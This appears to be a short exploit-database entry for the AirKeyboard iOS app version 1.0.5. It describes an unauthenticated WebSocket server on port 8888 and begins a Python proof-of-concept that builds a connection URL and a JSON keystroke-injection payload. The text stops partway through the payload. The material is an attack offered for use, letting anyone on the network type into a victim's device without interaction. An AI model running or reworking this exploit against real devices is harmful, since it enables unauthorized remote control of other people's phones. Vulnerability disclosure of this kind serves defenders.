# Exploit Title: AirKeyboard iOS App 1.0.5 - Remote Input Injection
# Date: 2025-06-13
# Exploit Author: Chokri Hammedi
# Vendor Homepage: https://airkeyboardapp.com
# Software Link: https://apps.apple.com/us/app/air-keyboard/id6463187929
# Version: Version 1.0.5
# Tested on: iOS 18.5 with AirKeyboard app
'''
Description:
The AirKeyboard iOS application exposes a WebSocket server on port 8888
which accepts arbitrary input injection messages from any client.
No authentication or pairing process is required. This allows any
attacker to type arbitrary keystrokes directly into the victimâ€™s iOS device
in real-time without user interaction, resulting in full remote input
control.
'''

import json
import time

ws\_url = f"ws://{target\_ip}:8888"

keystroke\_payload = {
"type": 1,
"text": f"{text}",
"mode": 0,
"shiftKey": True,
"selectionStart": 1,
"selectionEnd": 1
